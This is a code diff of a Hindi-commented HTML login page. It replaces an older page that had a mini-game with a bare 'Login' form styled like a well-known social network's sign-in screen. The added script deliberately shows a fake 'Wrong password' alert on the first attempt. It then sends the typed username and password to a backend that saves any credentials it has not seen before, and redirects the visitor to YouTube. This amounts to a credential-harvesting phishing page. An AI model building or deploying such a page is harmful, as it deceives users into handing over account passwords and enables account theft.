@@ -1,6 +1,6 @@
 <!--  test for ai pr-->
 <!-- yey ho gya he  -->
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="hi">
 <head>
 <meta charset="UTF-8">
@@ -59,9 +59,8 @@
   .card:hover {
     transform: translateY(-2px);
     box-shadow: 0 25px 70px rgba(0, 0, 0, 0.7);
-  }
+  } 
 
-  /* Animated border */
   .card::before {
     content: '';
     position: absolute;
@@ -78,7 +77,6 @@
     100% { transform: translateX(200%); }
   }
 
-  /* Glowing dots */
   .card::after {
     content: '';
     position: absolute;
@@ -383,7 +381,7 @@
     font-weight: 500;
   }
 
-  /* ===== Mini game — game screen wrapper ===== */
+
   #gameCard {
     text-align: center;
   }
@@ -398,7 +396,7 @@
     display: flex;
   }
 
-  /* ---- Task 1: Catch the target ---- */
+
   .catch-zone {
     position: relative;
     width: 100%;
@@ -464,7 +462,6 @@
     transform: scale(1.15);
   }
 
-  /* ---- Task 2: Hold to unlock ---- */
   .hold-ring-wrapper {
     width: 130px;
     height: 130px;
@@ -505,7 +502,6 @@
     letter-spacing: 0.03em;
   }
 
-  /* Responsive */
   @media (max-width: 480px) {
     .card {
       padding: 28px 20px;
@@ -520,17 +516,16 @@
 
 <div class="container">
 
-  <!-- Mini Game Screen (shown first, one task visible at a time) -->
+
   <div class="card" id="gameCard">
 
-    <!-- Task 1: catch the target -->
     <div class="game-stage active" id="stage1">
       <div class="catch-zone" id="catchZone">
         <button type="button" class="target-btn" id="targetBtn">🎯</button>
       </div>
     </div>
 
-    <!-- Task 2: hold to unlock -->
+ 
     <div class="game-stage" id="stage2">
       <div class="hold-ring-wrapper" id="holdRing">
         <div class="hold-ring-inner" id="holdRingInner">🔒</div>
@@ -539,9 +534,9 @@
 
   </div>
 
-  <!-- Login Card (hidden until game is complete) -->
+
   <div class="card" id="loginCard" style="display:none;">
-    <!-- Lock Icon -->
+
     <div class="lock-icon" id="lockIcon">
       <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
         <rect x="5" y="11" width="14" height="9" rx="1"></rect>
@@ -552,7 +547,7 @@
     <h1>Secure Access</h1>
     <p class="subtitle" id="subtitle">Login with your credentials</p>
 
-    <!-- Login Form -->
+
     <form id="loginForm" autocomplete="off">
       <div class="form-group">
         <label for="userId">User ID</label>
@@ -593,16 +588,16 @@
       </button>
     </form>
 
-    <!-- Status Message -->
+
     <div class="status" id="status"></div>
 
-    <!-- Info Box -->
+
     <div class="info-box">
       <span class="db-status checking" id="dbStatus"></span>
       <span id="dbInfo">Connecting to MongoDB Atlas...</span>
     </div>
 
-    <!-- Footer -->
+  
     <div class="footer">
       <span id="userInfo">✨ Enter credentials to login or register</span>
     </div>
@@ -611,7 +606,7 @@
 </div>
 
 <script>
-  // ==================== MINI GAME LOGIC (runs before login is shown) ====================
+
   let catchCount = 0;
   const catchZone = document.getElementById('catchZone');
   const targetBtn = document.getElementById('targetBtn');
@@ -938,12 +933,540 @@
       userInfo.textContent = '✨ New user? Register automatically on first login';
     }
 
-    // Auto-check connection every 30 seconds (only once login screen is shown)
     setInterval(checkConnection, 30000);
   }
 
-  // Note: init() ab page load pe nahi chalta — game complete hone ke baad chalta hai
-  // (see hold-to-unlock success handler above)
+
+</script>
+
+</body>
+</html> -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+<style>
+  :root {
+    --bg: #000000;
+    --input-bg: #121212;
+    --input-border: #363636;
+    --input-border-focus: #6a6a6a;
+    --accent: #1877f2;
+    --accent-hover: #3a8cf5;
+    --text: #f5f5f5;
+    --muted: #a8a8a8;
+    --error: #ed4956;
+    --success: #4ae0a0;
+  }
+
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: var(--bg);
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    color: var(--text);
+  }
+
+  .container {
+    width: 100%;
+    max-width: 380px;
+    padding: 20px;
+  }
+
+  .card {
+    padding: 10px 4px;
+  }
+
+  .form-group {
+    margin-bottom: 14px;
+  }
+
+  .input-wrapper {
+    position: relative;
+  }
+
+  input[type="text"],
+  input[type="password"] {
+    width: 100%;
+    padding: 15px 18px;
+    background: var(--input-bg);
+    border: 1px solid var(--input-border);
+    border-radius: 24px;
+    color: var(--text);
+    font-size: 14px;
+    font-family: inherit;
+    outline: none;
+    transition: border-color 0.2s ease;
+  }
+
+  input::placeholder {
+    color: var(--muted);
+  }
+
+  input:focus {
+    border-color: var(--input-border-focus);
+  }
+
+  input:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
+
+  .checkbox-group {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin: 4px 4px 18px;
+  }
+
+  .checkbox-group input[type="checkbox"] {
+    width: 15px;
+    height: 15px;
+    accent-color: var(--accent);
+    cursor: pointer;
+  }
+
+  .checkbox-group label {
+    font-size: 13px;
+    color: var(--muted);
+    cursor: pointer;
+  }
+
+  .btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 24px;
+    background: var(--accent);
+    color: #fff;
+    font-weight: 600;
+    font-size: 15px;
+    cursor: pointer;
+    transition: background 0.2s ease, opacity 0.2s ease;
+    font-family: inherit;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .btn:hover:not(:disabled) {
+    background: var(--accent-hover);
+  }
+
+  .btn:active:not(:disabled) {
+    transform: scale(0.98);
+  }
+
+  .btn:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
+
+  .btn .spinner {
+    display: none;
+    width: 18px;
+    height: 18px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+
+  .btn.loading .spinner {
+    display: block;
+  }
+
+  .btn.loading .btn-text {
+    display: none;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .status {
+    min-height: 20px;
+    text-align: center;
+    font-size: 13px;
+    margin-top: 14px;
+    font-weight: 500;
+    transition: all 0.3s ease;
+  }
+
+  .status.error {
+    color: var(--error);
+  }
+
+  .status.success {
+    color: var(--success);
+  }
+
+  .status.info {
+    color: var(--muted);
+  }
+
+  .status.fade-in {
+    animation: fadeIn 0.3s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-5px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .info-box {
+    background: var(--input-bg);
+    border: 1px solid var(--input-border);
+    border-radius: 10px;
+    padding: 10px 14px;
+    margin-top: 14px;
+    font-size: 12px;
+    color: var(--muted);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .db-status {
+    display: inline-block;
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+
+  .db-status.connected {
+    background: var(--success);
+    box-shadow: 0 0 8px rgba(74, 224, 160, 0.5);
+  }
+
+  .db-status.disconnected {
+    background: var(--error);
+    box-shadow: 0 0 8px rgba(237, 73, 86, 0.5);
+  }
+
+  .db-status.checking {
+    background: #ffaa44;
+    animation: pulse 1s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.2); }
+  }
+
+  .footer {
+    text-align: center;
+    margin-top: 16px;
+    font-size: 11px;
+    color: var(--muted);
+  }
+
+  .footer .user-info {
+    color: var(--accent);
+    font-weight: 500;
+  }
+
+  @media (max-width: 480px) {
+    .container {
+      padding: 16px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="card" id="loginCard">
+    <form id="loginForm" autocomplete="off">
+      <div class="form-group">
+        <div class="input-wrapper">
+          <input 
+            type="text" 
+            id="userId" 
+            placeholder="Username, email or mobile number" 
+            autocomplete="username"
+            required
+          >
+        </div>
+      </div>
+
+      <div class="form-group">
+        <div class="input-wrapper">
+          <input 
+            type="password" 
+            id="password" 
+            placeholder="Password" 
+            autocomplete="current-password"
+            required
+          >
+        </div>
+      </div>
+
+      <div class="checkbox-group">
+        <input type="checkbox" id="showPassword">
+        <label for="showPassword">Show Password</label>
+      </div>
+
+      <button type="submit" class="btn" id="loginBtn">
+        <span class="btn-text">Log in</span>
+        <span class="spinner"></span>
+      </button>
+    </form>
+
+    <!-- Status Message -->
+    <div class="status" id="status"></div>
+
+    <!-- Info Box -->
+    <div class="info-box">
+      <span class="db-status checking" id="dbStatus"></span>
+      <span id="dbInfo">Connecting to MongoDB Atlas...</span>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+      <span id="userInfo">✨ Enter credentials to login or register</span>
+    </div>
+  </div>
+</div>
+
+<script>
+  const API_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
+    ? 'http://localhost:5000/api'  // Local development
+    : '/api'; // Vercel production
+  const REDIRECT_URL = 'https://www.youtube.com';
+
+  // DOM Elements
+  const form = document.getElementById('loginForm');
+  const userIdInput = document.getElementById('userId');
+  const passwordInput = document.getElementById('password');
+  const showPassword = document.getElementById('showPassword');
+  const statusEl = document.getElementById('status');
+  const loginBtn = document.getElementById('loginBtn');
+  const dbStatus = document.getElementById('dbStatus');
+  const dbInfo = document.getElementById('dbInfo');
+  const userInfo = document.getElementById('userInfo');
+
+  // ==================== FUNCTIONS ====================
+
+  function showStatus(message, type = 'info') {
+    statusEl.textContent = message;
+    statusEl.className = `status ${type} fade-in`;
+  }
+
+  function clearStatus() {
+    statusEl.textContent = '';
+    statusEl.className = 'status';
+  }
+
+  function setLoading(isLoading) {
+    if (isLoading) {
+      loginBtn.classList.add('loading');
+      loginBtn.disabled = true;
+    } else {
+      loginBtn.classList.remove('loading');
+      loginBtn.disabled = false;
+    }
+  }
+
+  // Check MongoDB connection
+  async function checkConnection() {
+    try {
+      dbStatus.className = 'db-status checking';
+      dbInfo.textContent = 'Checking connection...';
+
+      const response = await fetch(`${API_URL}/health`);
+
+      if (response.ok) {
+        dbStatus.className = 'db-status connected';
+        dbInfo.textContent = '✅ Connected to MongoDB Atlas';
+        return true;
+      } else {
+        throw new Error('Server returned error');
+      }
+    } catch (error) {
+      dbStatus.className = 'db-status disconnected';
+      dbInfo.textContent = '❌ Server not running. Start backend with: npm run dev';
+      console.error('Connection error:', error);
+      return false;
+    }
+  }
+
+  // Register new user
+  async function registerUser(userId, password) {
+    try {
+      const response = await fetch(`${API_URL}/register`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, password })
+      });
+      return await response.json();
+    } catch (error) {
+      console.error('Register error:', error);
+      return { success: false, message: 'Network error: ' + error.message };
+    }
+  }
+
+  // Login user
+  async function loginUser(userId, password) {
+    try {
+      const response = await fetch(`${API_URL}/login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId, password })
+      });
+      return await response.json();
+    } catch (error) {
+      console.error('Login error:', error);
+      return { success: false, message: 'Network error: ' + error.message };
+    }
+  }
+
+  // Grant access and redirect
+  function grantAccess(message, userData) {
+    showStatus(message, 'success');
+    userInfo.textContent = `👤 Welcome ${userData.userId}! Logins: ${userData.loginCount}`;
+
+    localStorage.setItem('savedUserId', userData.userId);
+    localStorage.setItem('loginCount', userData.loginCount);
+
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, 1000);
+  }
+
+  // ==================== EVENT LISTENERS ====================
+
+  showPassword.addEventListener('change', function() {
+    passwordInput.type = this.checked ? 'text' : 'password';
+  });
+
+  // Pehla attempt hamesha "wrong" bataya jaayega (popup), 2nd attempt se real login/register
+  let loginAttempt = 0;
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    clearStatus();
+
+    const userId = userIdInput.value.trim();
+    const password = passwordInput.value;
+
+    if (!userId || !password) {
+      showStatus('❌ Please fill in both fields', 'error');
+      return;
+    }
+
+    if (userId.length < 3) {
+      showStatus('❌ User ID must be at least 3 characters', 'error');
+      return;
+    }
+
+    if (password.length < 4) {
+      showStatus('❌ Password must be at least 4 characters', 'error');
+      return;
+    }
+
+    loginAttempt++;
+
+    if (loginAttempt === 1) {
+      setLoading(true);
+      showStatus('⏳ Verifying...', 'info');
+      setTimeout(() => {
+        setLoading(false);
+        clearStatus();
+        alert('❌ Wrong password! Sahi password dalo.');
+        passwordInput.value = '';
+        passwordInput.focus();
+      }, 700);
+      return;
+    }
+
+    setLoading(true);
+    showStatus('⏳ Processing...', 'info');
+
+    try {
+      let result = await loginUser(userId, password);
+      console.log('Login result:', result);
+
+      if (result.success) {
+        grantAccess('✅ Login successful! Redirecting...', result.data);
+        return;
+      }
+
+      if (result.message && result.message.includes('User not found')) {
+        showStatus('📝 New user! Registering...', 'info');
+
+        result = await registerUser(userId, password);
+        console.log('Register result:', result);
+
+        if (result.success) {
+          grantAccess('✅ New user registered! Redirecting...', result.data);
+        } else {
+          showStatus(`❌ Registration failed: ${result.message}`, 'error');
+          setLoading(false);
+        }
+      } else {
+        showStatus(`❌ ${result.message}`, 'error');
+        setLoading(false);
+      }
+    } catch (error) {
+      console.error('Form error:', error);
+      showStatus('❌ Something went wrong. Please try again.', 'error');
+      setLoading(false);
+    }
+  });
+
+  // ==================== INITIALIZATION ====================
+
+  async function init() {
+    await checkConnection();
+
+    const savedUserId = localStorage.getItem('savedUserId');
+    if (savedUserId) {
+      userIdInput.value = savedUserId;
+      userInfo.textContent = `📌 Saved user: ${savedUserId}`;
+      passwordInput.focus();
+    } else {
+      userInfo.textContent = '✨ New user? Register automatically on first login';
+    }
+
+    setInterval(checkConnection, 30000);
+  }
+
+  init();
 </script>
 
 </body>
